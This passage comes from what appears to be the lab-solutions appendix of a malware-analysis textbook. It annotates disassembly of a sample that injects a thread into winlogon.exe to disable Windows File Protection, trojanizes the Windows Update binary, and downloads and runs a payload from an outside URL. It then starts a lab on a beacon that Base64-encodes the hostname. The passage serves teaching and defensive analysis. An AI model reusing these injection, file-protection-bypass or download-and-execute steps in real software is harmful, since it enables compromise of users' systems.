- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 00401087 lea eax, [ebp+var_120]
  prefs: []
  type: TYPE_NORMAL
- en: 0040108D push eax
  prefs: []
  type: TYPE_NORMAL
- en: 0040108E push 4
  prefs: []
  type: TYPE_NORMAL
- en: 00401090 lea ecx, [ebp+var_11C]
  prefs: []
  type: TYPE_NORMAL
- en: 00401096 push ecx
  prefs: []
  type: TYPE_NORMAL
- en: 00401097 mov edx, [ebp+hObject]
  prefs: []
  type: TYPE_NORMAL
- en: 0040109A push edx
  prefs: []
  type: TYPE_NORMAL
- en: 0040109B call myEnumProcessModules
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-24L: For each process, enumerate the modules* As shown in Listing
    12-25L, the malware attempts to get the base name of the module’s PID by using
    GetModuleBaseNameA. If it succeeds, Str1 will contain the string of the base name
    of the module for the PID passed to this subroutine; if not, it will keep the
    initialized value "<not real>".'
  prefs: []
  type: TYPE_NORMAL
- en: 004010A5 push 104h
  prefs: []
  type: TYPE_NORMAL
- en: 004010AA lea eax, [ebp+Str1]; will change
  prefs: []
  type: TYPE_NORMAL
- en: 004010B0 push eax
  prefs: []
  type: TYPE_NORMAL
- en: 004010B1 mov ecx, [ebp+var_11C]
  prefs: []
  type: TYPE_NORMAL
- en: 004010B7 push ecx
  prefs: []
  type: TYPE_NORMAL
- en: 004010B8 mov edx, [ebp+hObject]
  prefs: []
  type: TYPE_NORMAL
- en: 004010BB push edx
  prefs: []
  type: TYPE_NORMAL
- en: 004010BC call myGetModuleBaseNameA
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-25L: Getting the name of each module*'
  prefs: []
  type: TYPE_NORMAL
- en: The old initialized string "<not real>" should have the name of the base module
    returned from GetModuleBaseNameA. This string is compared to the
  prefs: []
  type: TYPE_NORMAL
- en: '"winlogon.exe" string. If the strings match, EAX will be equal to 0, and the
    function will return with EAX equal to 1\. If the strings do not match, EAX'
  prefs: []
  type: TYPE_NORMAL
- en: will be equal to 0 on return. We can now safely say that sub_401000 is attempting
    to determine which PID is associated with *winlogon.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: Now that we know what sub_401000 does, we can rename it as PIDLookup.
  prefs: []
  type: TYPE_NORMAL
- en: Notice at  in Listing 12-26L that the return value in EAX is tested to see
    if it is 0\. If so, the code jumps to loc_4014CF, incrementing the loop counter
    and rerunning the PIDLookup function with a new PID. Otherwise, if the PID
  prefs: []
  type: TYPE_NORMAL
- en: matched *winlogon.exe*, then the PID will be passed to the sub_401174, as seen
    at  in the listing.
  prefs: []
  type: TYPE_NORMAL
- en: '**602**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 004014A3 call PIDLookup
  prefs: []
  type: TYPE_NORMAL
- en: 004014A8 add esp, 4
  prefs: []
  type: TYPE_NORMAL
- en: 004014AB mov [ebp+var_114], eax
  prefs: []
  type: TYPE_NORMAL
- en: 004014B1 cmp [ebp+var_114], 0 
  prefs: []
  type: TYPE_NORMAL
- en: 004014B8 jz short loc_4014CF
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 004014E4 mov ecx, [ebp+var_1234]
  prefs: []
  type: TYPE_NORMAL
- en: 004014EA push ecx ; dwProcessId
  prefs: []
  type: TYPE_NORMAL
- en: 004014EB call **sub_401174** 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-26L: PID lookup and comparison*'
  prefs: []
  type: TYPE_NORMAL
- en: Examining sub_401174, we see another subroutine called immediately, with the
    argument SeDebugPrivilege. This function performs the SeDebugPrivilege privilege-escalation
    procedure we discussed extensively in Chapter 11\.
  prefs: []
  type: TYPE_NORMAL
- en: Following the SeDebugPrivilege escalation function, we see sfc_os.dll passed
    to LoadLibraryA, as shown at  in Listing 12-27L. Next, GetProcAddress is called
    on the handle to *sfc_os.dll* and ordinal 2 (an undocumented Windows function).
    Ordinal 2 is pushed onto the stack at . The function pointer of ordinal 2 is
    saved to lpStartAddress at  (the label provided by IDA Pro). The malware then
    calls OpenProcess on the PID of *winlogon.exe* and dwDesiredAccess of 0x1F0FFF
    (symbolic constant for PROCESS_ALL_ACCESS). The handle to *winlogon.exe* is saved
    to hProcess at .
  prefs: []
  type: TYPE_NORMAL
- en: '**1 2**'
  prefs: []
  type: TYPE_NORMAL
- en: 004011A1 push 2  ; lpProcName
  prefs: []
  type: TYPE_NORMAL
- en: 004011A3 push offset LibFileName ; " **sfc_os.dll**"
  prefs: []
  type: TYPE_NORMAL
- en: 004011A8 call ds:**LoadLibraryA** 
  prefs: []
  type: TYPE_NORMAL
- en: 004011AE push eax ; hModule
  prefs: []
  type: TYPE_NORMAL
- en: 004011AF call ds:**GetProcAddress**
  prefs: []
  type: TYPE_NORMAL
- en: 004011B5 mov **lpStartAddress**, eax 
  prefs: []
  type: TYPE_NORMAL
- en: 004011BA mov eax, [ebp+dwProcessId]
  prefs: []
  type: TYPE_NORMAL
- en: 004011BD push eax ; dwProcessId
  prefs: []
  type: TYPE_NORMAL
- en: 004011BE push 0 ; bInheritHandle
  prefs: []
  type: TYPE_NORMAL
- en: 004011C0 push 1F0FFFh ; dwDesiredAccess
  prefs: []
  type: TYPE_NORMAL
- en: 004011C5 call ds:**OpenProcess**
  prefs: []
  type: TYPE_NORMAL
- en: 004011CB mov [ebp+hProcess], eax 
  prefs: []
  type: TYPE_NORMAL
- en: 004011CE cmp [ebp+hProcess], 0
  prefs: []
  type: TYPE_NORMAL
- en: 004011D2 jnz short loc_4011D
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-27L: Resolving ordinal 2 of sfc_os.dll and opening a handle to
    Winlogon* The code in Listing 12-28L calls CreateRemoteThread. Examining the arguments
    for CreateRemoteThread, we see that the hProcess parameter at  is EDX, our *winlogon.exe*
    handle. The lpStartAddress passed at  is a pointer to the function at *sfc_os.dll*
    at ordinal 2 that injects a thread into *winlogon.exe*.'
  prefs: []
  type: TYPE_NORMAL
- en: (Because *sfc_os.dll* is already loaded inside *winlogon.exe*, there is no need
    to load the DLL within the newly created remote thread, so we don’t have a call
    to WriteProcessMemory.) That thread is ordinal 2 of *sfc_os.dll*.
  prefs: []
  type: TYPE_NORMAL
- en: 004011D8 push 0 ; lpThreadId
  prefs: []
  type: TYPE_NORMAL
- en: 004011DA push 0 ; dwCreationFlags
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**603**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 004011DC push 0 ; lpParameter 004011DE mov ecx, lpStartAddress 
  prefs: []
  type: TYPE_NORMAL
- en: 004011E4 push ecx ; lpStartAddress
  prefs: []
  type: TYPE_NORMAL
- en: 004011E5 push 0 ; dwStackSize
  prefs: []
  type: TYPE_NORMAL
- en: 004011E7 push 0 ; lpThreadAttributes 004011E9 mov edx, [ebp+hProcess]
  prefs: []
  type: TYPE_NORMAL
- en: 004011EC push edx ; hProcess 
  prefs: []
  type: TYPE_NORMAL
- en: 004011ED call ds:**CreateRemoteThread**
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-28L: Calling CreateRemoteThread for a remote process* But what
    are *sfc_os.dll* and export ordinal 2? The DLL *sfc_os.dll* is partially responsible
    for Windows File Protection, a series of threads running within *winlogon.exe*.
    Ordinal 2 of *sfc_os.dll* is an unnamed export known as SfcTerminateWatcherThread.'
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*The information about* sfc_os.dll *and export ordinal 2 given here is undocumented.*'
  prefs: []
  type: TYPE_NORMAL
- en: '*To avoid needing to reverse-engineer the Windows DLL, search the Internet
    for*'
  prefs: []
  type: TYPE_NORMAL
- en: '*“sfc_os.dll ordinal 2” to see what information you can find.*'
  prefs: []
  type: TYPE_NORMAL
- en: SfcTerminateWatcherThread must run inside *winlogon.exe* in order to successfully
    execute. By forcing the SfcTerminateWatcherThread function to execute, the malware
    disables Windows File Protection until the next system reboot.
  prefs: []
  type: TYPE_NORMAL
- en: If the thread is injected properly, the code in Listing 12-29L executes, building
    a string. When the code executes, GetWindowsDirectoryA at  returns a pointer
    to the current Windows directory (usually *C:\Windows*), and the malware passes
    this string and \system32\wupdmgr.exe to an _snprintf call, as shown at  and
    . This code will typically build the string "C:\Windows\ system32\wupdmgr.exe",
    which will be stored in ExistingFileName. *Wupdmgr.exe* is used for Windows updates
    under Windows XP.
  prefs: []
  type: TYPE_NORMAL
- en: 00401506 push 10Eh ; uSize
  prefs: []
  type: TYPE_NORMAL
- en: 0040150B lea edx, [ebp+Buffer]
  prefs: []
  type: TYPE_NORMAL
- en: 00401511 push edx ; lpBuffer
  prefs: []
  type: TYPE_NORMAL
- en: 00401512 call ds:**GetWindowsDirectoryA** 
  prefs: []
  type: TYPE_NORMAL
- en: 00401518 push offset aSystem32Wupdmg ; \\system32\\wupdmgr.exe 
  prefs: []
  type: TYPE_NORMAL
- en: 0040151D lea eax, [ebp+Buffer]
  prefs: []
  type: TYPE_NORMAL
- en: 00401523 push eax 
  prefs: []
  type: TYPE_NORMAL
- en: 00401524 push offset aSS ; "%s%s"
  prefs: []
  type: TYPE_NORMAL
- en: 00401529 push 10Eh ; Count
  prefs: []
  type: TYPE_NORMAL
- en: 0040152E lea ecx, [ebp+**ExistingFileName**]
  prefs: []
  type: TYPE_NORMAL
- en: 00401534 push ecx ; Dest
  prefs: []
  type: TYPE_NORMAL
- en: 00401535 call ds:**_snprintf**
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-29L: Building a string for the* wupdmgr.exe *path* In Listing 12-30L,
    we see another string being built. A call to GetTempPathA at  gives us a pointer
    to the current user’s temporary directory, usually *C:\* *Documents and Settings\<username>\Local\Temp*.
    The temporary directory path is then passed to another _snprintf call with the
    parameter \\winup.exe, as seen at  and , creating the string "C:\Documents and
    Settings\ *username*\ Local\Temp\winup.exe", which is stored in NewFileName.'
  prefs: []
  type: TYPE_NORMAL
- en: '**604**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 0040153B add esp, 14h
  prefs: []
  type: TYPE_NORMAL
- en: 0040153E lea edx, [ebp+var_110]
  prefs: []
  type: TYPE_NORMAL
- en: 00401544 push edx ; lpBuffer
  prefs: []
  type: TYPE_NORMAL
- en: 00401545 push 10Eh ; nBufferLength
  prefs: []
  type: TYPE_NORMAL
- en: 0040154A call ds:**GetTempPathA** 
  prefs: []
  type: TYPE_NORMAL
- en: 00401550 push offset aWinup_exe ; \\winup.exe 
  prefs: []
  type: TYPE_NORMAL
- en: 00401555 lea eax, [ebp+var_110]
  prefs: []
  type: TYPE_NORMAL
- en: 0040155B push eax 
  prefs: []
  type: TYPE_NORMAL
- en: 0040155C push offset aSS_0 ; "%s%s"
  prefs: []
  type: TYPE_NORMAL
- en: 00401561 push 10Eh ; Count
  prefs: []
  type: TYPE_NORMAL
- en: 00401566 lea ecx, [ebp+**NewFileName**]
  prefs: []
  type: TYPE_NORMAL
- en: 0040156C push ecx ; Dest
  prefs: []
  type: TYPE_NORMAL
- en: 0040156D call ds:**_snprintf**
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-30L: Building a string for the* winup.exe *path* We can now see
    why IDA Pro renamed two local variables to NewFileName and ExistingFileName. These
    local variables are used in the MoveFileA call, as shown in Listing 12-31L at
    . The MoveFileA function will move the Windows Update binary to the user’s temporary
    directory.'
  prefs: []
  type: TYPE_NORMAL
- en: 00401576 lea edx, [ebp+**NewFileName**]
  prefs: []
  type: TYPE_NORMAL
- en: 0040157C push edx ; lpNewFileName
  prefs: []
  type: TYPE_NORMAL
- en: 0040157D lea eax, [ebp+**ExistingFileName**]
  prefs: []
  type: TYPE_NORMAL
- en: 00401583 push eax ; lpExistingFileName **1 2**
  prefs: []
  type: TYPE_NORMAL
- en: 00401584 call ds:**MoveFileA** 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-31L: Moving the Windows Update binary to the temporary directory*
    In Listing 12-32L, we see the malware calling GetModuleHandleA at , which returns
    a module handle for the current process. We then see a series of resources section
    APIs, specifically, FindResourceA with parameters'
  prefs: []
  type: TYPE_NORMAL
- en: '#101 and BIN. As we guessed as a result of our earlier basic analysis, the
    malware is extracting its resource section to disk.'
  prefs: []
  type: TYPE_NORMAL
- en: 004012A1 call ds:**GetModuleHandleA** 
  prefs: []
  type: TYPE_NORMAL
- en: 004012A7 mov [ebp+hModule], eax
  prefs: []
  type: TYPE_NORMAL
- en: 004012AA push offset Type ; "BIN"
  prefs: []
  type: TYPE_NORMAL
- en: 004012AF push offset Name ; "#101"
  prefs: []
  type: TYPE_NORMAL
- en: 004012B4 mov eax, [ebp+hModule]
  prefs: []
  type: TYPE_NORMAL
- en: 004012B7 push eax ; hModule
  prefs: []
  type: TYPE_NORMAL
- en: 004012B8 call ds:**FindResourceA**
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-32L: Resource extraction*'
  prefs: []
  type: TYPE_NORMAL
- en: Later in this function, following the call to FindResourceA, are calls to LoadResource,
    SizeofResource, CreateFileA, and WriteFile (not shown here). This combination
    of function calls extracts the file from the resource section BIN
  prefs: []
  type: TYPE_NORMAL
- en: and writes the file to *C:\Windows\System32\wupdmgr.exe*. The malware is creating
    a new Windows Update binary handler. Under normal circumstances, its attempt to
    create a new handler would fail because Windows File Protection Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**605**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: would detect a change in the file and overwrite the newly created one, but because
    the malware disabled this functionality, it can overwrite normally protected Windows
    binaries.
  prefs: []
  type: TYPE_NORMAL
- en: The last thing this function does is launch the new *wupdmgr.exe* using WinExec.
    The function is launched with an uCmdShow parameter of 0, or SW_HIDE, as shown
    at  in Listing 12-33L, in order to hide the program window.
  prefs: []
  type: TYPE_NORMAL
- en: 0040133C push 0  ;
  prefs: []
  type: TYPE_NORMAL
- en: uCmdShow
  prefs: []
  type: TYPE_NORMAL
- en: 0040133E lea edx, [ebp+FileName]
  prefs: []
  type: TYPE_NORMAL
- en: 00401344 push edx ; lpCmdLine
  prefs: []
  type: TYPE_NORMAL
- en: 00401345 call ds:WinExec
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-33L: Launching the extracted file*'
  prefs: []
  type: TYPE_NORMAL
- en: Having completed our analysis of this binary, let’s examine the binary extracted
    from its resource section. To get the binary, run the malware and open the newly
    created *wupdmgr.exe* or use Resource Hacker to carve out the file.
  prefs: []
  type: TYPE_NORMAL
- en: After loading the malware into IDA Pro, we see a familiar subset of calls in
    the main function. The malware creates a string to our temporary move of the original
    Windows Update binary (C:\Documents and Settings\ *username*\ Local\Temp\winup.exe),
    and then runs the original Windows Update binary (using WinExec), which was saved
    to the user’s temporary directory. If the user were to perform a Windows Update,
    everything would appear to operate normally; the original Windows Update file
    would run.
  prefs: []
  type: TYPE_NORMAL
- en: Next, in IDA Pro, we see construction of the string C:\Windows\system32\ wupdmgrd.exe
    beginning at 0x4010C3, to be stored in a local variable Dest.
  prefs: []
  type: TYPE_NORMAL
- en: Other than the *d* in the filename, this string is very close to the original
    Windows Update binary name.
  prefs: []
  type: TYPE_NORMAL
- en: In Listing 12-34L, notice the API call to URLDownloadToFileA. This call takes
    some interesting parameters that deserve further inspection.
  prefs: []
  type: TYPE_NORMAL
- en: 004010EF push 0 ; LPBINDSTATUSCALLBACK
  prefs: []
  type: TYPE_NORMAL
- en: 004010F1 push 0 ; DWORD
  prefs: []
  type: TYPE_NORMAL
- en: 004010F3 lea ecx, [ebp+Dest] 
  prefs: []
  type: TYPE_NORMAL
- en: 004010F9 push ecx ; LPCSTR
  prefs: []
  type: TYPE_NORMAL
- en: 004010FA push offset aHttpWww_practi  ; "http://www.practicalmal..."
  prefs: []
  type: TYPE_NORMAL
- en: 004010FF push 0 ; LPUNKNOWN
  prefs: []
  type: TYPE_NORMAL
- en: 00401101 call **URLDownloadToFileA**
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-34L: Analyzing the extracted and launched malware* The parameter
    at , szURL, is set to http://www.practicalmalwareanalysis'
  prefs: []
  type: TYPE_NORMAL
- en: .com/updater.exe. At , the szFileName parameter is set to Dest (C:\Windows\
    system32\wupdmgrd.exe). The malware is doing its own updating, downloading more
    malware! The downloaded *updater.exe* file will be saved to *wupdmgrd.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: The malware compares the return value from URLDownloadToFileA with 0 to see
    if the function call failed. If the return value is not 0, the malware will execute
    the newly created file. The binary will then return and exit.
  prefs: []
  type: TYPE_NORMAL
- en: '**606**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Our analysis of the malware in this lab has introduced a common way that malware
    alters Windows functionality by disabling Windows File Protection. The malware
    in this lab trojanized the Windows Update process and created its own malware
    update routine. Users with this malware on their machine would see normal functionality
    because the malware did not completely destroy the original Windows Update binary.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 13-1 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: Two strings appear in the beacon that are not present in the malware.
  prefs: []
  type: TYPE_NORMAL
- en: (When the strings command is run, the strings are not output.) One is the domain,
    www.practicalmalwareanalysis.com. The other is the GET request path, which may
    look something like aG9zdG5hbWUtZm9v.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The xor instruction at 004011B8 leads to a single-byte XOR-encoding loop in
    sub_401190\.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: The single-byte XOR encoding uses the byte 0x3B. The raw data resource with
    index 101 is an XOR-encoded buffer that decodes to www.practicalmalwareanalysis.com.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: 'The PEiD KANAL plug-in and the IDA Entropy Plugin can identify the use of the
    standard Base64 encoding string:'
  prefs: []
  type: TYPE_NORMAL
- en: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
  prefs: []
  type: TYPE_NORMAL
- en: '**1 3**'
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: Standard Base64 encoding is used to create the GET request string.
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: The Base64 encoding function starts at 0x004010B1\.
  prefs: []
  type: TYPE_NORMAL
- en: 7\.
  prefs: []
  type: TYPE_NORMAL
- en: '*Lab13-01.exe* copies a maximum of 12 bytes from the hostname before Base64
    encoding it, which makes the GET request string a maximum of 16'
  prefs: []
  type: TYPE_NORMAL
- en: characters.
  prefs: []
  type: TYPE_NORMAL
- en: 8\.
  prefs: []
  type: TYPE_NORMAL
- en: Padding characters may be used if the hostname length is less than 12
  prefs: []
  type: TYPE_NORMAL
- en: bytes and not evenly divisible by 3\.
  prefs: []
  type: TYPE_NORMAL
- en: 9\.
  prefs: []
  type: TYPE_NORMAL
- en: '*Lab13-01.exe* sends a regular beacon with an encoded hostname until it receives
    a specific response. Then it quits.'
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: Let’s start by running *Lab13-01.exe* and monitoring its behavior. If you have
    a listening server set up (running ApateDNS and INetSim), you will notice that
    the malware beacons to www.practicalmalwareanalysis.com, with content similar
    to what is shown in Listing 13-1L.
  prefs: []
  type: TYPE_NORMAL
- en: GET /**aG9zdG5hbWUtZm9v**/ HTTP/1.1
  prefs: []
  type: TYPE_NORMAL
- en: 'User-Agent: Mozilla/4.0'
  prefs: []
  type: TYPE_NORMAL
- en: 'Host: **www.practicalmalwareanalysis.com**'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 13-1L:* Lab13-01.exe *’s beacon*'
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**607**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 134](index-641_1.png)'
  prefs: []
  type: TYPE_IMG
- en: Looking at the strings, we see Mozilla/4.0, but the strings aG9zdG5hbWUtZm9v
    and www.practicalmalwareanalysis.com (bolded in Listing 13-1L) are not found.
  prefs: []
  type: TYPE_NORMAL
- en: Therefore, we can assume that these strings might be encoded by the malware.
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*The aG9zdG5hbWUtZm9v string is based on the hostname, so you will likely have
    a different string in your listing. Also, Windows networking libraries provide
    some elements of* *the network beacon, such as GET, HTTP/1.1, User-Agent, and
    Host. Thus, we don’t* *expect to find these elements in the malware itself.*'
  prefs: []
  type: TYPE_NORMAL
- en: Next, we use static analysis to search the malware for evidence of encoding
    techniques. Searching for all instances of nonzeroing xor instructions in IDA
    Pro, we find three examples, but two of them (at 0x00402BE2 and 0x00402BE6) are
    identified as library code, which is why the search window does not list the function
    names. This code can be ignored, leaving just the xor eax,3Bh instruction.
  prefs: []
  type: TYPE_NORMAL
- en: The xor eax,3Bh instruction is contained in sub_401190, as shown in Figure 13-1L.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 13-1L: Single-byte XOR loop with 0x3B*'
  prefs: []
  type: TYPE_NORMAL
- en: '*in sub_401190*'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 13-1L contains a small loop that appears to increment a counter (var_4)
    and modify the contents of a buffer (arg_0) by XOR’ing the original contents with
    0x3B. The other argument (arg_4) is the length of the buffer that should be XOR’ed.
    The simple function sub_401190, which we’ll rename xorEncode, implements a single-byte
    XOR encoding with the static byte 0x3B, taking the buffer and length as arguments.
  prefs: []
  type: TYPE_NORMAL
- en: '**608**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 135](index-642_1.png)'
  prefs: []
  type: TYPE_IMG
- en: Next, let’s identify the content affected by xorEncode. The function sub_401300
    is the only one that calls xorEncode. Tracing its code blocks that precede the
    call to xorEncode, we see (in order) calls to GetModuleHandleA, FindResourceA,
    SizeofResource, GlobalAlloc, LoadResource, and LockResource. The malware is doing
    something with a resource just prior to calling xorEncode.
  prefs: []
  type: TYPE_NORMAL
- en: Of these resource-related functions, the function that will point us to the
    resource that we should investigate is FindResourceA.
  prefs: []
  type: TYPE_NORMAL
- en: Listing 13-2L shows the FindResourceA function at .
  prefs: []
  type: TYPE_NORMAL
- en: push 0Ah ; lpType
  prefs: []
  type: TYPE_NORMAL
- en: push 101 ; lpName
  prefs: []
  type: TYPE_NORMAL
- en: mov eax, [ebp+hModule]
  prefs: []
  type: TYPE_NORMAL
- en: push eax ; hModule
  prefs: []
  type: TYPE_NORMAL
- en: call ds:FindResourceA 
  prefs: []
  type: TYPE_NORMAL
- en: mov [ebp+hResInfo], eax
  prefs: []
  type: TYPE_NORMAL
- en: cmp [ebp+hResInfo], 0
  prefs: []
  type: TYPE_NORMAL
- en: jnz short loc_401357
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 13-2L: Call to FindResourceA*'
  prefs: []
  type: TYPE_NORMAL
- en: IDA Pro has labeled the parameters for us. The lpType is 0xA, which designates
    the resource data as application-defined, or raw data. The lpName parameter can
    be either a name or an index number. In this case, it is an index number. Since
    the function references a resource with an ID of 101, we look up the resource
    in the PE file with PEview and find an RCDATA resource with the index of 101 (0x65),
    with a resource 32 bytes long at offset 0x7060\.
  prefs: []
  type: TYPE_NORMAL
- en: We open the executable in WinHex and highlight bytes 7060 through 7080\.
  prefs: []
  type: TYPE_NORMAL
- en: '**1 3**'
  prefs: []
  type: TYPE_NORMAL
- en: Then we choose **Edit****Modify Data**, select **XOR**, and enter **3B**. Figure
    13-2L
  prefs: []
  type: TYPE_NORMAL
- en: shows the result.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 13-2L: Resource obfuscated with single-byte XOR encoding* The top portion
    of Figure 13-2L shows the original version of the data, and the bottom portion
    shows the effect of applying XOR with 0x3B'
  prefs: []
  type: TYPE_NORMAL
- en: to each byte. The figure clearly shows that the resource stores the string www.practicalmalwareanalysis.com
    in encoded form.
  prefs: []
  type: TYPE_NORMAL
- en: Of the two strings that we suspected might be encoded, we’ve found the domain,
    but not the GET request string (aG9zdG5hbWUtZm9v in our example). To find the
    GET string, we’ll use PEiD’s KANAL plug-in, which identifies a Base64
  prefs: []
  type: TYPE_NORMAL
- en: table at 0x004050E8\. Listing 13-3L shows the output of the KANAL plug-in.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**609**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 136](index-643_1.png)'
  prefs: []
  type: TYPE_IMG
- en: 'BASE64 table :: 000050E8 :: 004050E8 '
  prefs: []
  type: TYPE_NORMAL
- en: Referenced at 00401013
  prefs: []
  type: TYPE_NORMAL
- en: Referenced at 0040103E
  prefs: []
  type: TYPE_NORMAL
- en: Referenced at 0040106E
  prefs: []
  type: TYPE_NORMAL
- en: Referenced at 00401097
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 13-3L: PEiD KANAL output*'
  prefs: []
  type: TYPE_NORMAL
- en: Navigating to this Base64 table, we see that it is the standard Base64
  prefs: []
  type: TYPE_NORMAL
- en: 'string: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/. This
    string has four cross-references in IDA Pro, all in one function that starts at
    0x00401000, so we’ll refer to this function as base64index. Figure 13-3L shows
    one of the code blocks in this function.'
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 13-3L: Base64 padding*'
  prefs: []
  type: TYPE_NORMAL
- en: As you can see, a fork references an = character in the box on the right side
    of Figure 13-3L. This supports the conclusion that base64index is related to Base64
    encoding, because = is used for padding in Base64 encoding.
  prefs: []
  type: TYPE_NORMAL
- en: The function that calls base64index is the real base64_encode function located
    at 0x004010B1\. Its purpose is to divide the source string into a 3-byte block,
    and to pass each to base64index to encode the 3 bytes into a 4-byte one.
  prefs: []
  type: TYPE_NORMAL
- en: Some of the clues that make this apparent are the use of strlen at the beginning
    of the function to find the length of the source string, the comparison with the
    number 3 (cmp [ebp+var_14], 3) at the start of the outer loop (code block loc_401100),
    and the comparison with the number 4 (cmp [ebp+var_14], 4) at the start of the
    inner write loop that occurs after base64index has returned results. We conclude
    that base64_encode is the main Base64-encoding function that takes as arguments
    a source string and destination buffer to perform Base64 translation.
  prefs: []
  type: TYPE_NORMAL
- en: Using IDA Pro, we find that there is only one cross-reference to base64_encode
    (0x004000B1), which is in a function at 0x004011C9 that we will refer to as beacon.
    The call to base64_encode is shown in Listing 13-4L at .
  prefs: []
  type: TYPE_NORMAL
- en: 004011FA lea edx, [ebp+hostname]
  prefs: []
  type: TYPE_NORMAL
- en: 00401200 push edx ; name
  prefs: []
  type: TYPE_NORMAL
- en: 00401201 call gethostname 
  prefs: []
  type: TYPE_NORMAL
- en: 00401206 mov [ebp+var_4], eax
  prefs: []
  type: TYPE_NORMAL
- en: 00401209 push 12  ; Count
  prefs: []
  type: TYPE_NORMAL
- en: 0040120B lea eax, [ebp+hostname]
  prefs: []
  type: TYPE_NORMAL
- en: 00401211 push eax ; Source **610**
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 00401212 lea ecx, [ebp+Src]
  prefs: []
  type: TYPE_NORMAL
- en: 00401215 push ecx ; Dest
  prefs: []
  type: TYPE_NORMAL
- en: 00401216 call strncpy 
  prefs: []
  type: TYPE_NORMAL
- en: 0040121B add esp, 0Ch
  prefs: []
  type: TYPE_NORMAL
- en: 0040121E mov [ebp+var_C], 0
  prefs: []
  type: TYPE_NORMAL
- en: 00401222 lea edx, [ebp+Dst]
  prefs: []
  type: TYPE_NORMAL
- en: 00401225 push edx ; int
  prefs: []
  type: TYPE_NORMAL
- en: 00401226 lea eax, [ebp+Src]
  prefs: []
  type: TYPE_NORMAL
- en: 00401229 push eax ; Str
  prefs: []
  type: TYPE_NORMAL
- en: 0040122A call base64_encode 
  prefs: []
  type: TYPE_NORMAL
- en: 0040122F add esp, 8
  prefs: []
  type: TYPE_NORMAL
- en: 00401232 mov byte ptr [ebp+var_23+3], 0
  prefs: []
  type: TYPE_NORMAL
- en: 00401236 lea ecx, [ebp+Dst]
  prefs: []
  type: TYPE_NORMAL
- en: 00401239 push ecx
  prefs: []
  type: TYPE_NORMAL
